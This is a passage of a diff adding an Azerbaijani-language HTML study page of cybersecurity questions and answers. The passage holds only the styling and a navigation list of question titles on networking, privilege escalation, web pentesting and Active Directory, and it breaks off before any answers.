@@ -1,0 +1,2642 @@
+<!DOCTYPE html>
+<html lang="az">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Kibertəhlükəsizlik — Suallar və Cavablar</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Fraunces:opsz,wght@9..144,500;9..144,600;9..144,700&family=IBM+Plex+Sans:wght@400;500;600;700&family=IBM+Plex+Mono:wght@400;500&display=swap" rel="stylesheet">
+<style>
+:root{
+  --ink:#0d1622; --ink2:#13202f; --line:#1f3043;
+  --paper:#f6f3ec; --paper2:#fffdf8; --text:#23303d; --muted:#6a7785;
+  --red:#c0212c; --red-soft:#fbeceb; --blue:#1f6db0; --blue-soft:#eaf2fa;
+  --accent:#d98324;
+  --side-w:330px;
+}
+*{box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{margin:0;font-family:"IBM Plex Sans",system-ui,sans-serif;color:var(--text);
+  background:var(--paper);line-height:1.62;font-size:16px;-webkit-font-smoothing:antialiased}
+
+/* ---------- Sidebar ---------- */
+.sidebar{position:fixed;top:0;left:0;width:var(--side-w);height:100vh;
+  background:linear-gradient(180deg,#0d1622 0%,#101d2b 100%);color:#cdd8e4;
+  display:flex;flex-direction:column;border-right:1px solid #000;z-index:40}
+.brand{padding:22px 22px 16px;border-bottom:1px solid var(--line)}
+.brand .kicker{font-family:"IBM Plex Mono",monospace;font-size:11px;letter-spacing:.22em;
+  text-transform:uppercase;color:var(--accent);margin:0 0 6px}
+.brand h1{font-family:"Fraunces",serif;font-weight:600;font-size:22px;line-height:1.15;margin:0;color:#fff}
+.brand .meta{font-size:12px;color:#7f8ea0;margin-top:8px;font-family:"IBM Plex Mono",monospace}
+.search-wrap{padding:14px 18px;border-bottom:1px solid var(--line)}
+.search-wrap input{width:100%;background:#0a121c;border:1px solid var(--line);border-radius:9px;
+  color:#dfe7ef;padding:10px 12px;font:inherit;font-size:14px;outline:none}
+.search-wrap input::placeholder{color:#5d6c7d}
+.search-wrap input:focus{border-color:var(--blue);box-shadow:0 0 0 3px rgba(31,109,176,.18)}
+
+nav{overflow-y:auto;flex:1;padding:8px 10px 40px}
+nav::-webkit-scrollbar{width:9px} nav::-webkit-scrollbar-thumb{background:#22344a;border-radius:9px}
+nav ul{list-style:none;margin:0;padding:0}
+.nav-cat{margin:2px 0}
+.cat-btn{width:100%;display:flex;align-items:center;gap:10px;background:none;border:0;
+  color:#c4d0dd;cursor:pointer;padding:9px 10px;border-radius:9px;text-align:left;font:inherit;
+  transition:background .15s}
+.cat-btn:hover{background:#16263a}
+.cat-num{font-family:"IBM Plex Mono",monospace;font-size:12px;color:var(--accent);
+  background:#0a121c;border:1px solid var(--line);border-radius:6px;padding:2px 6px;flex:none}
+.cat-name{flex:1;font-size:14.5px;font-weight:500;line-height:1.3}
+.chev{width:8px;height:8px;border-right:2px solid #6c7c8d;border-bottom:2px solid #6c7c8d;
+  transform:rotate(-45deg);transition:transform .2s;flex:none;margin-right:4px}
+.nav-cat.open .chev{transform:rotate(45deg)}
+.nav-cat.open .cat-btn{background:#16263a;color:#fff}
+.q-list{max-height:0;overflow:hidden;transition:max-height .35s ease;margin:0 0 0 6px;
+  border-left:1px solid var(--line);padding-left:0}
+.nav-cat.open .q-list{max-height:3000px}
+.q-list li{margin:0}
+.q-list a{display:flex;gap:9px;align-items:baseline;padding:6px 10px 6px 14px;color:#9fb0c2;
+  text-decoration:none;font-size:13px;border-radius:0 8px 8px 0;transition:.13s}
+.q-list a:hover{background:#16263a;color:#eaf1f8}
+.q-list a.active{background:linear-gradient(90deg,rgba(192,33,44,.22),transparent);
+  color:#fff;box-shadow:inset 3px 0 0 var(--red)}
+.qn{font-family:"IBM Plex Mono",monospace;color:var(--red);font-size:12px;flex:none;min-width:22px}
+.q-list a.active .qn{color:#ff8a90}
+.qt{flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+
+/* ---------- Main ---------- */
+.main{margin-left:var(--side-w);padding:0}
+.hero{background:var(--ink);color:#eef3f8;padding:54px 7vw 46px;border-bottom:4px solid var(--red)}
+.hero .tag{font-family:"IBM Plex Mono",monospace;font-size:12px;letter-spacing:.24em;
+  text-transform:uppercase;color:var(--accent);margin:0 0 12px}
+.hero h1{font-family:"Fraunces",serif;font-weight:700;font-size:clamp(34px,5vw,56px);
+  line-height:1.04;margin:0;color:#fff;letter-spacing:-.01em}
+.hero p{max-width:620px;color:#9fb0c2;margin:16px 0 0;font-size:16px}
+.hero .stats{display:flex;gap:26px;margin-top:26px;flex-wrap:wrap}
+.hero .stat b{font-family:"Fraunces",serif;font-size:26px;color:#fff;display:block;line-height:1}
+.hero .stat span{font-size:12px;color:#7f8ea0;font-family:"IBM Plex Mono",monospace;text-transform:uppercase;letter-spacing:.1em}
+
+.content{max-width:860px;margin:0 auto;padding:10px 7vw 120px}
+.cat-section{padding-top:46px;scroll-margin-top:20px}
+.cat-head{display:flex;align-items:center;gap:16px;margin:18px 0 6px;
+  padding-bottom:14px;border-bottom:2px solid var(--ink)}
+.cat-head-num{font-family:"IBM Plex Mono",monospace;font-size:15px;font-weight:500;color:#fff;
+  background:var(--ink);border-radius:9px;padding:8px 12px;flex:none}
+.cat-head h2{font-family:"Fraunces",serif;font-weight:600;font-size:clamp(24px,3.4vw,34px);
+  margin:0;color:var(--ink);line-height:1.1;letter-spacing:-.01em}
+.note{background:var(--blue-soft);border-left:4px solid var(--blue);border-radius:0 12px 12px 0;
+  padding:14px 18px;margin:18px 0 8px;display:flex;gap:14px;align-items:flex-start}
+.note-label{font-family:"IBM Plex Mono",monospace;font-size:11px;letter-spacing:.12em;
+  text-transform:uppercase;color:var(--blue);font-weight:600;flex:none;margin-top:3px}
+.note p{margin:0;font-size:14.5px;color:#33495c}
+
+.qa{scroll-margin-top:18px;padding:26px 0;border-bottom:1px solid #e6e0d3}
+.qa:target .qa-q h3{}
+.qa-q{display:flex;flex-direction:column;gap:10px;margin-bottom:14px}
+.badge{align-self:flex-start;font-family:"IBM Plex Mono",monospace;font-size:12px;font-weight:500;
+  color:#fff;background:var(--red);padding:3px 11px;border-radius:20px;letter-spacing:.04em}
+.qa-q h3{font-family:"Fraunces",serif;font-weight:600;font-size:22px;line-height:1.25;margin:0;color:var(--ink)}
+.qa:target .badge{box-shadow:0 0 0 4px var(--red-soft)}
+.qa-a>p{margin:10px 0}
+.qa-a>p strong,.blist strong{font-weight:600;color:var(--ink)}
+h4.sub{font-family:"IBM Plex Sans",sans-serif;font-weight:600;font-size:15px;color:var(--blue);
+  margin:20px 0 8px;display:flex;align-items:center;gap:9px}
+h4.sub::before{content:"";width:7px;height:7px;background:var(--blue);transform:rotate(45deg);flex:none}
+.blist{margin:8px 0;padding:0;list-style:none}
+.blist li{position:relative;padding:4px 0 4px 22px;margin:3px 0}
+.blist li::before{content:"";position:absolute;left:4px;top:14px;width:6px;height:6px;
+  border-radius:50%;background:var(--red)}
+pre.code{background:var(--ink);color:#dce8f2;border-radius:11px;padding:15px 17px;overflow-x:auto;
+  margin:14px 0;font-family:"IBM Plex Mono",monospace;font-size:13.5px;line-height:1.6;
+  border:1px solid #000;box-shadow:0 6px 20px -12px rgba(13,22,34,.5)}
+pre.code code{font-family:inherit;color:#c5e0c5}
+
+.backtop{position:fixed;right:22px;bottom:22px;z-index:30;background:var(--ink);color:#fff;
+  border:0;width:46px;height:46px;border-radius:50%;cursor:pointer;font-size:20px;display:none;
+  box-shadow:0 8px 24px -8px rgba(13,22,34,.6);transition:.2s}
+.backtop:hover{background:var(--red);transform:translateY(-2px)}
+.backtop.show{display:block}
+
+.menu-btn{display:none;position:fixed;top:14px;left:14px;z-index:60;background:var(--ink);color:#fff;
+  border:0;border-radius:10px;width:46px;height:46px;font-size:20px;cursor:pointer;
+  box-shadow:0 6px 18px -8px rgba(0,0,0,.5)}
+.scrim{display:none;position:fixed;inset:0;background:rgba(8,14,22,.5);z-index:35}
+.no-result{padding:14px;color:#8a98a8;font-size:13px;text-align:center}
+
+@media (max-width:920px){
+  .menu-btn{display:block}
+  .sidebar{transform:translateX(-100%);transition:transform .28s ease}
+  body.nav-open .sidebar{transform:none}
+  body.nav-open .scrim{display:block}
+  .main{margin-left:0}
+  .hero{padding-top:74px}
+}
+</style>
+</head>
+<body>
+<button class="menu-btn" id="menuBtn" aria-label="Menyu">☰</button>
+<div class="scrim" id="scrim"></div>
+
+<aside class="sidebar" id="sidebar">
+  <div class="brand">
+    <p class="kicker">Təkrar Materialı</p>
+    <h1>Kibertəhlükəsizlik</h1>
+    <p class="meta">10 kateqoriya · 126 sual</p>
+  </div>
+  <div class="search-wrap">
+    <input type="search" id="search" placeholder="Mövzu və ya sual axtar…" autocomplete="off">
+  </div>
+  <nav id="nav"><ul>
+<li class="nav-cat" data-cat="cat1">
+<button class="cat-btn" aria-expanded="false" data-target="cat1"><span class="cat-num">01</span><span class="cat-name">Kibertəhlükəsizlik Əsasları</span><span class="chev" aria-hidden="true"></span></button>
+<ul class="q-list">
+<li><a href="#q1" data-q="q1"><span class="qn">1</span><span class="qt">Ransomware nədir?</span></a></li>
+<li><a href="#q2" data-q="q2"><span class="qn">2</span><span class="qt">Hacktivist qrup nədir?</span></a></li>
+<li><a href="#q3" data-q="q3"><span class="qn">3</span><span class="qt">DoS və DDoS nədir, fərqi nədir?</span></a></li>
+<li><a href="#q4" data-q="q4"><span class="qn">4</span><span class="qt">Zero Trust nədir?</span></a></li>
+<li><a href="#q5" data-q="q5"><span class="qn">5</span><span class="qt">Script Kiddie nədir?</span></a></li>
+<li><a href="#q6" data-q="q6"><span class="qn">6</span><span class="qt">Backdoor nədir?</span></a></li>
+<li><a href="#q7" data-q="q7"><span class="qn">7</span><span class="qt">Trojan nədir?</span></a></li>
+<li><a href="#q8" data-q="q8"><span class="qn">8</span><span class="qt">DNS hücumları nədir?</span></a></li>
+<li><a href="#q9" data-q="q9"><span class="qn">9</span><span class="qt">Rootkit və Bootkit nədir, fərqi nədir?</span></a></li>
+<li><a href="#q10" data-q="q10"><span class="qn">10</span><span class="qt">Insider və Insider Threat nədir?</span></a></li>
+</ul></li>
+<li class="nav-cat" data-cat="cat2">
+<button class="cat-btn" aria-expanded="false" data-target="cat2"><span class="cat-num">02</span><span class="cat-name">İnformasiya Təhlükəsizliyi və Anlayışlar</span><span class="chev" aria-hidden="true"></span></button>
+<ul class="q-list">
+<li><a href="#q11" data-q="q11"><span class="qn">11</span><span class="qt">Məxfilik (Privacy) nədir?</span></a></li>
+<li><a href="#q12" data-q="q12"><span class="qn">12</span><span class="qt">CIA Triadı nədir?</span></a></li>
+<li><a href="#q13" data-q="q13"><span class="qn">13</span><span class="qt">Şəbəkə, Tətbiq və IoT təhlükəsizliyi nədir?</span></a></li>
+<li><a href="#q14" data-q="q14"><span class="qn">14</span><span class="qt">Pentest və Red Teaming fərqi nədir?</span></a></li>
+<li><a href="#q15" data-q="q15"><span class="qn">15</span><span class="qt">Virus nədir və növləri hansılardır?</span></a></li>
+<li><a href="#q16" data-q="q16"><span class="qn">16</span><span class="qt">Worm nədir və növləri hansılardır?</span></a></li>
+</ul></li>
+<li class="nav-cat" data-cat="cat3">
+<button class="cat-btn" aria-expanded="false" data-target="cat3"><span class="cat-num">03</span><span class="cat-name">Linux Əsasları</span><span class="chev" aria-hidden="true"></span></button>
+<ul class="q-list">
+<li><a href="#q17" data-q="q17"><span class="qn">17</span><span class="qt">Linux fayl sisteminin əsas qovluqları hansılardır?</span></a></li>
+<li><a href="#q18" data-q="q18"><span class="qn">18</span><span class="qt">systemctl-də start, stop, enable, disable nə edir?</span></a></li>
+<li><a href="#q19" data-q="q19"><span class="qn">19</span><span class="qt">Environment Variable nədir?</span></a></li>
+<li><a href="#q20" data-q="q20"><span class="qn">20</span><span class="qt">Linux privesc nədir və enumeration necə aparılır?</span></a></li>
+<li><a href="#q21" data-q="q21"><span class="qn">21</span><span class="qt">SUID/SGID binariləri ilə privesc (GTFOBins) necədir?</span></a></li>
+<li><a href="#q22" data-q="q22"><span class="qn">22</span><span class="qt">Sudo səhv konfiqurasiyaları ilə privesc necədir?</span></a></li>
+<li><a href="#q23" data-q="q23"><span class="qn">23</span><span class="qt">Linux Capabilities ilə privesc necədir?</span></a></li>
+<li><a href="#q24" data-q="q24"><span class="qn">24</span><span class="qt">Cron job-lar ilə privesc necədir?</span></a></li>
+<li><a href="#q25" data-q="q25"><span class="qn">25</span><span class="qt">PATH hijacking (relative path) ilə privesc necədir?</span></a></li>
+<li><a href="#q26" data-q="q26"><span class="qn">26</span><span class="qt">Yazıla bilən /etc/passwd, /etc/shadow, /etc/sudoers necə istismar edilir?</span></a></li>
+<li><a href="#q27" data-q="q27"><span class="qn">27</span><span class="qt">Kernel exploit-ləri (Dirty COW, Dirty Pipe, PwnKit) hansılardır?</span></a></li>
+<li><a href="#q28" data-q="q28"><span class="qn">28</span><span class="qt">NFS no_root_squash ilə privesc necədir?</span></a></li>
+<li><a href="#q29" data-q="q29"><span class="qn">29</span><span class="qt">Docker, LXD və disk qrupu ilə privesc necədir?</span></a></li>
+<li><a href="#q30" data-q="q30"><span class="qn">30</span><span class="qt">Wildcard injection (tar, chown, rsync) nədir?</span></a></li>
+<li><a href="#q31" data-q="q31"><span class="qn">31</span><span class="qt">Yazıla bilən systemd service / service faylı ilə privesc?</span></a></li>
+<li><a href="#q32" data-q="q32"><span class="qn">32</span><span class="qt">Credential harvesting və həssas fayllar harada axtarılır?</span></a></li>
+<li><a href="#q33" data-q="q33"><span class="qn">33</span><span class="qt">Linux privesc — ümumi attack chain və alətlər xülasəsi</span></a></li>
+</ul></li>
+<li class="nav-cat" data-cat="cat4">
+<button class="cat-btn" aria-expanded="false" data-target="cat4"><span class="cat-num">04</span><span class="cat-name">Şəbəkə (Networking)</span><span class="chev" aria-hidden="true"></span></button>
+<ul class="q-list">
+<li><a href="#q34" data-q="q34"><span class="qn">34</span><span class="qt">Router nədir və hansı layer-də işləyir?</span></a></li>
+<li><a href="#q35" data-q="q35"><span class="qn">35</span><span class="qt">Modem və Switch nədir?</span></a></li>
+<li><a href="#q36" data-q="q36"><span class="qn">36</span><span class="qt">Şəbəkə protokolu nədir və OSI modelinin 7 layeri hansılardır?</span></a></li>
+<li><a href="#q37" data-q="q37"><span class="qn">37</span><span class="qt">Fayl göndərmə prosesi OSI ilə necə baş verir?</span></a></li>
+<li><a href="#q38" data-q="q38"><span class="qn">38</span><span class="qt">TCP/IP modelinin 4 layeri hansılardır?</span></a></li>
+<li><a href="#q39" data-q="q39"><span class="qn">39</span><span class="qt">Hər OSI layer-də tipik hücum hansıdır?</span></a></li>
+<li><a href="#q40" data-q="q40"><span class="qn">40</span><span class="qt">IPv4 və IPv6 nədir, fərqləri nələrdir?</span></a></li>
+<li><a href="#q41" data-q="q41"><span class="qn">41</span><span class="qt">Network address, broadcast address və istifadə oluna bilən IP-lər nədir?</span></a></li>
+<li><a href="#q42" data-q="q42"><span class="qn">42</span><span class="qt">LAN, WAN, PAN, MAN nədir?</span></a></li>
+<li><a href="#q43" data-q="q43"><span class="qn">43</span><span class="qt">Private və Public IP aralıqları hansılardır?</span></a></li>
+<li><a href="#q44" data-q="q44"><span class="qn">44</span><span class="qt">IP class-ları və default subnet mask-ları hansılardır?</span></a></li>
+<li><a href="#q45" data-q="q45"><span class="qn">45</span><span class="qt">Host sayı necə hesablanır və əsas CIDR-lər hansılardır?</span></a></li>
+<li><a href="#q46" data-q="q46"><span class="qn">46</span><span class="qt">İki IP eyni şəbəkədə sayılması üçün hansı şərtlər lazımdır?</span></a></li>
+<li><a href="#q47" data-q="q47"><span class="qn">47</span><span class="qt">Subnet Mask nədir?</span></a></li>
+<li><a href="#q48" data-q="q48"><span class="qn">48</span><span class="qt">DHCP nədir və workflow-u necədir?</span></a></li>
+<li><a href="#q49" data-q="q49"><span class="qn">49</span><span class="qt">Default Gateway nədir?</span></a></li>
+<li><a href="#q50" data-q="q50"><span class="qn">50</span><span class="qt">NAT nədir və növləri hansılardır?</span></a></li>
+<li><a href="#q51" data-q="q51"><span class="qn">51</span><span class="qt">APIPA nədir və IP-lər niyə üst-üstə düşmür?</span></a></li>
+<li><a href="#q52" data-q="q52"><span class="qn">52</span><span class="qt">ICMP nədir?</span></a></li>
+<li><a href="#q53" data-q="q53"><span class="qn">53</span><span class="qt">ARP nədir və necə işləyir?</span></a></li>
+<li><a href="#q54" data-q="q54"><span class="qn">54</span><span class="qt">Əsas Application Layer protokolları və portları hansılardır?</span></a></li>
+<li><a href="#q55" data-q="q55"><span class="qn">55</span><span class="qt">DNS nədir, hansı serverlər və record-lar var?</span></a></li>
+<li><a href="#q56" data-q="q56"><span class="qn">56</span><span class="qt">SFTP, FTPS və TFTP arasında fərq nədir?</span></a></li>
+<li><a href="#q57" data-q="q57"><span class="qn">57</span><span class="qt">SMTP, POP3 və IMAP nədir?</span></a></li>
+<li><a href="#q58" data-q="q58"><span class="qn">58</span><span class="qt">HTTP, HTTPS, SSL və TLS nədir?</span></a></li>
+<li><a href="#q59" data-q="q59"><span class="qn">59</span><span class="qt">VPN nədir və tunneling protokolları hansılardır?</span></a></li>
+<li><a href="#q60" data-q="q60"><span class="qn">60</span><span class="qt">Proxy nədir?</span></a></li>
+<li><a href="#q61" data-q="q61"><span class="qn">61</span><span class="qt">OSPF, RIP, BGP və STP routing protokolları nədir?</span></a></li>
+</ul></li>
+<li class="nav-cat" data-cat="cat5">
+<button class="cat-btn" aria-expanded="false" data-target="cat5"><span class="cat-num">05</span><span class="cat-name">Veb Pentest</span><span class="chev" aria-hidden="true"></span></button>
+<ul class="q-list">
+<li><a href="#q62" data-q="q62"><span class="qn">62</span><span class="qt">Broken Access Control və IDOR nədir, fərqi nədir?</span></a></li>
+<li><a href="#q63" data-q="q63"><span class="qn">63</span><span class="qt">IDOR harada axtarılır və necə test edilir?</span></a></li>
+<li><a href="#q64" data-q="q64"><span class="qn">64</span><span class="qt">IDOR-un qarşısı necə alınır?</span></a></li>
+<li><a href="#q65" data-q="q65"><span class="qn">65</span><span class="qt">Token nədir və necə işləyir?</span></a></li>
+<li><a href="#q66" data-q="q66"><span class="qn">66</span><span class="qt">Path Traversal və LFI nədir, fərqi nədir?</span></a></li>
+<li><a href="#q67" data-q="q67"><span class="qn">67</span><span class="qt">RFI nədir və LFI-dən fərqi nədir?</span></a></li>
+<li><a href="#q68" data-q="q68"><span class="qn">68</span><span class="qt">BOLA, RB, RBAC, ABAC, MFLAC nədir?</span></a></li>
+<li><a href="#q69" data-q="q69"><span class="qn">69</span><span class="qt">Log Poisoning və PHP Wrappers nədir?</span></a></li>
+<li><a href="#q70" data-q="q70"><span class="qn">70</span><span class="qt">SQL Injection (SQLi) nədir?</span></a></li>
+<li><a href="#q71" data-q="q71"><span class="qn">71</span><span class="qt">Ən çox istifadə olunan SQL portları hansılardır?</span></a></li>
+<li><a href="#q72" data-q="q72"><span class="qn">72</span><span class="qt">MySQL-də ən çox istifadə olunan SQLi funksiyaları hansılardır?</span></a></li>
+<li><a href="#q73" data-q="q73"><span class="qn">73</span><span class="qt">SQLi növləri hansılardır?</span></a></li>
+<li><a href="#q74" data-q="q74"><span class="qn">74</span><span class="qt">Bir saytda SQLi olub-olmadığını necə anlayırıq?</span></a></li>
+<li><a href="#q75" data-q="q75"><span class="qn">75</span><span class="qt">SQLi exploitation və tools necədir?</span></a></li>
+<li><a href="#q76" data-q="q76"><span class="qn">76</span><span class="qt">SQL Injection-un qarşısı necə alınır?</span></a></li>
+<li><a href="#q77" data-q="q77"><span class="qn">77</span><span class="qt">XSS (Cross-Site Scripting) nədir?</span></a></li>
+<li><a href="#q78" data-q="q78"><span class="qn">78</span><span class="qt">XSS növləri hansılardır?</span></a></li>
+<li><a href="#q79" data-q="q79"><span class="qn">79</span><span class="qt">XSS-in qarşısı necə alınır?</span></a></li>
+<li><a href="#q80" data-q="q80"><span class="qn">80</span><span class="qt">File Upload zəifliyi nədir və bypass texnikaları hansılardır?</span></a></li>
+<li><a href="#q81" data-q="q81"><span class="qn">81</span><span class="qt">File Upload zəifliyinin qarşısı və .htaccess nədir?</span></a></li>
+<li><a href="#q82" data-q="q82"><span class="qn">82</span><span class="qt">Web shell və reverse shell texnikaları hansılardır?</span></a></li>
+<li><a href="#q83" data-q="q83"><span class="qn">83</span><span class="qt">Web pentest attack chain və alətlər hansılardır?</span></a></li>
+<li><a href="#q84" data-q="q84"><span class="qn">84</span><span class="qt">SSRF nədir və növləri hansılardır?</span></a></li>
+<li><a href="#q85" data-q="q85"><span class="qn">85</span><span class="qt">SSRF necə exploit edilir və qarşısı necə alınır?</span></a></li>
+<li><a href="#q86" data-q="q86"><span class="qn">86</span><span class="qt">Open Redirect nədir və SSRF bypass-da necə işləyir?</span></a></li>
+<li><a href="#q87" data-q="q87"><span class="qn">87</span><span class="qt">SSRF və Open Redirect arasında əsas fərq nədir?</span></a></li>
+<li><a href="#q88" data-q="q88"><span class="qn">88</span><span class="qt">CSRF nədir və qarşısı necə alınır?</span></a></li>
+<li><a href="#q89" data-q="q89"><span class="qn">89</span><span class="qt">Session və Cookie nədir?</span></a></li>
+<li><a href="#q90" data-q="q90"><span class="qn">90</span><span class="qt">Cookie hansı parametrlərə görə fərqlənir (təhlükəsizlik baxımından)?</span></a></li>
+<li><a href="#q91" data-q="q91"><span class="qn">91</span><span class="qt">Clickjacking nədir və qarşısı necə alınır?</span></a></li>
+<li><a href="#q92" data-q="q92"><span class="qn">92</span><span class="qt">XXE nədir və necə işləyir?</span></a></li>
+<li><a href="#q93" data-q="q93"><span class="qn">93</span><span class="qt">XXE növləri hansılardır?</span></a></li>
+<li><a href="#q94" data-q="q94"><span class="qn">94</span><span class="qt">XXE necə tapılır və qarşısı necə alınır?</span></a></li>
+</ul></li>
+<li class="nav-cat" data-cat="cat6">
+<button class="cat-btn" aria-expanded="false" data-target="cat6"><span class="cat-num">06</span><span class="cat-name">Active Directory (AD)</span><span class="chev" aria-hidden="true"></span></button>
+<ul class="q-list">
+<li><a href="#q95" data-q="q95"><span class="qn">95</span><span class="qt">Active Directory (AD) nədir və nəyi idarə edir?</span></a></li>
+<li><a href="#q96" data-q="q96"><span class="qn">96</span><span class="qt">Forest, Tree, Domain, Child Domain nədir?</span></a></li>
+<li><a href="#q97" data-q="q97"><span class="qn">97</span><span class="qt">Domain əslində nədir (rolları)?</span></a></li>
+<li><a href="#q98" data-q="q98"><span class="qn">98</span><span class="qt">OU (Organizational Unit) nədir?</span></a></li>
+<li><a href="#q99" data-q="q99"><span class="qn">99</span><span class="qt">AD-nin fiziki strukturu nədir (DC, Site)?</span></a></li>
+<li><a href="#q100" data-q="q100"><span class="qn">100</span><span class="qt">AD-də hansı admin qrupları var?</span></a></li>
+<li><a href="#q101" data-q="q101"><span class="qn">101</span><span class="qt">Local Admin, Domain Admin və Enterprise Admin fərqi nədir?</span></a></li>
+<li><a href="#q102" data-q="q102"><span class="qn">102</span><span class="qt">Workgroup nədir?</span></a></li>
+<li><a href="#q103" data-q="q103"><span class="qn">103</span><span class="qt">Global Catalog (GC) nədir?</span></a></li>
+<li><a href="#q104" data-q="q104"><span class="qn">104</span><span class="qt">FSMO rolları hansılardır və ən vacibi hansıdır?</span></a></li>
+<li><a href="#q105" data-q="q105"><span class="qn">105</span><span class="qt">NTLM və Kerberos necə işləyir, fərqi nədir?</span></a></li>
+<li><a href="#q106" data-q="q106"><span class="qn">106</span><span class="qt">LDAP nədir?</span></a></li>
+<li><a href="#q107" data-q="q107"><span class="qn">107</span><span class="qt">Trust Relationship nədir və növləri hansılardır?</span></a></li>
+<li><a href="#q108" data-q="q108"><span class="qn">108</span><span class="qt">GPO (Group Policy Object) nədir və kimə verilir?</span></a></li>
+<li><a href="#q109" data-q="q109"><span class="qn">109</span><span class="qt">AD-də əsas servis portları hansılardır?</span></a></li>
+<li><a href="#q110" data-q="q110"><span class="qn">110</span><span class="qt">Kerberos necə işləyir (addım-addım)?</span></a></li>
+<li><a href="#q111" data-q="q111"><span class="qn">111</span><span class="qt">Kerberos əsaslı hücumlar hansılardır?</span></a></li>
+<li><a href="#q112" data-q="q112"><span class="qn">112</span><span class="qt">SPN və UPN nədir, fərqi nədir?</span></a></li>
+<li><a href="#q113" data-q="q113"><span class="qn">113</span><span class="qt">Golden, Silver və Diamond Ticket nədir, fərqləri nələrdir?</span></a></li>
+<li><a href="#q114" data-q="q114"><span class="qn">114</span><span class="qt">Delegation nədir və növləri hansılardır?</span></a></li>
+<li><a href="#q115" data-q="q115"><span class="qn">115</span><span class="qt">Delegation növlərinin qorunma tədbirləri hansılardır?</span></a></li>
+<li><a href="#q116" data-q="q116"><span class="qn">116</span><span class="qt">CIFS nədir?</span></a></li>
+<li><a href="#q117" data-q="q117"><span class="qn">117</span><span class="qt">Member Server, Domain Controller və DMZ nədir?</span></a></li>
+<li><a href="#q118" data-q="q118"><span class="qn">118</span><span class="qt">AD harada işləyir (Windows, Linux, macOS)?</span></a></li>
+<li><a href="#q119" data-q="q119"><span class="qn">119</span><span class="qt">C2 (Command and Control) nədir?</span></a></li>
+<li><a href="#q120" data-q="q120"><span class="qn">120</span><span class="qt">Mimikatz əsas komandaları hansılardır?</span></a></li>
+<li><a href="#q121" data-q="q121"><span class="qn">121</span><span class="qt">AD enumeration və post-exploitation iş axını (workflow) necədir?</span></a></li>
+<li><a href="#q122" data-q="q122"><span class="qn">122</span><span class="qt">Windows privesc nədir və enumeration necə aparılır?</span></a></li>
+<li><a href="#q123" data-q="q123"><span class="qn">123</span><span class="qt">Token/privilege abuse — SeImpersonatePrivilege (Potato hücumları)?</span></a></li>
+<li><a href="#q124" data-q="q124"><span class="qn">124</span><span class="qt">SeBackup/SeRestore/SeTakeOwnership privilege istismarı?</span></a></li>
+<li><a href="#q125" data-q="q125"><span class="qn">125</span><span class="qt">Unquoted Service Path nədir və necə istismar edilir?</span></a></li>
+<li><a href="#q126" data-q="q126"><span class="qn">126</span><span class="qt">Zəif Service icazələri ilə privesc (sc, accesschk)?</span></a></li>
+<li><a href="#q127" data-q="q127"><span class="qn">127</span><span class="qt">AlwaysInstallElevated nədir?</span></a></li>
+<li><a href="#q128" data-q="q128"><span class="qn">128</span><span class="qt">DLL Hijacking ilə privesc necədir?</span></a></li>
+<li><a href="#q129" data-q="q129"><span class="qn">129</span><span class="qt">Saxlanılan credential-lar (cmdkey, SAM, LSASS, AutoLogon)?</span></a></li>
+<li><a href="#q130" data-q="q130"><span class="qn">130</span><span class="qt">Scheduled Tasks ilə privesc necədir?</span></a></li>
+<li><a href="#q131" data-q="q131"><span class="qn">131</span><span class="qt">Registry AutoRun və zəif registry icazələri?</span></a></li>
+<li><a href="#q132" data-q="q132"><span class="qn">132</span><span class="qt">UAC bypass nədir?</span></a></li>
+<li><a href="#q133" data-q="q133"><span class="qn">133</span><span class="qt">Windows kernel exploit-ləri və attack chain xülasəsi?</span></a></li>
+</ul></li>
+<li class="nav-cat" data-cat="cat7">
+<button class="cat-btn" aria-expanded="false" data-target="cat7"><span class="cat-num">07</span><span class="cat-name">Pivoting, Proxy və Port Forwarding</span><span class="chev" aria-hidden="true"></span></button>
+<ul class="q-list">
+<li><a href="#q134" data-q="q134"><span class="qn">134</span><span class="qt">Proxy, SOCKS Proxy və Reverse Proxy nədir?</span></a></li>
+<li><a href="#q135" data-q="q135"><span class="qn">135</span><span class="qt">Remote Port Forwarding nədir?</span></a></li>
+<li><a href="#q136" data-q="q136"><span class="qn">136</span><span class="qt">Dynamic Port Forwarding (SOCKS Proxy) nədir?</span></a></li>
+</ul></li>
+<li class="nav-cat" data-cat="cat8">
+<button class="cat-btn" aria-expanded="false" data-target="cat8"><span class="cat-num">08</span><span class="cat-name">Giriş Nəzarəti Modelləri və Fayl Inclusion</span><span class="chev" aria-hidden="true"></span></button>
+<ul class="q-list">
+<li><a href="#q137" data-q="q137"><span class="qn">137</span><span class="qt">IDOR (Insecure Direct Object Reference) nədir?</span></a></li>
+<li><a href="#q138" data-q="q138"><span class="qn">138</span><span class="qt">BOLA (Broken Object Level Authorization) nədir?</span></a></li>
+<li><a href="#q139" data-q="q139"><span class="qn">139</span><span class="qt">MFLAC (Missing Function Level Access Control) nədir?</span></a></li>
+<li><a href="#q140" data-q="q140"><span class="qn">140</span><span class="qt">BFLA (Broken Function Level Authorization) nədir?</span></a></li>
+<li><a href="#q141" data-q="q141"><span class="qn">141</span><span class="qt">MAC (Mandatory Access Control) nədir?</span></a></li>
+<li><a href="#q142" data-q="q142"><span class="qn">142</span><span class="qt">DAC (Discretionary Access Control) nədir?</span></a></li>
+<li><a href="#q143" data-q="q143"><span class="qn">143</span><span class="qt">RBAC (Role-Based Access Control) nədir?</span></a></li>
+<li><a href="#q144" data-q="q144"><span class="qn">144</span><span class="qt">RB-RBAC (Rule-Based RBAC) nədir?</span></a></li>
+<li><a href="#q145" data-q="q145"><span class="qn">145</span><span class="qt">ABAC (Attribute-Based Access Control) nədir?</span></a></li>
+<li><a href="#q146" data-q="q146"><span class="qn">146</span><span class="qt">LFI (Local File Inclusion) nədir?</span></a></li>
+<li><a href="#q147" data-q="q147"><span class="qn">147</span><span class="qt">RFI (Remote File Inclusion) nədir?</span></a></li>
+</ul></li>
+<li class="nav-cat" data-cat="cat9">
+<button class="cat-btn" aria-expanded="false" data-target="cat9"><span class="cat-num">09</span><span class="cat-name">SQL Injection — Database Portları, Reverse Shell və Müdafiə</span><span class="chev" aria-hidden="true"></span></button>
+<ul class="q-list">
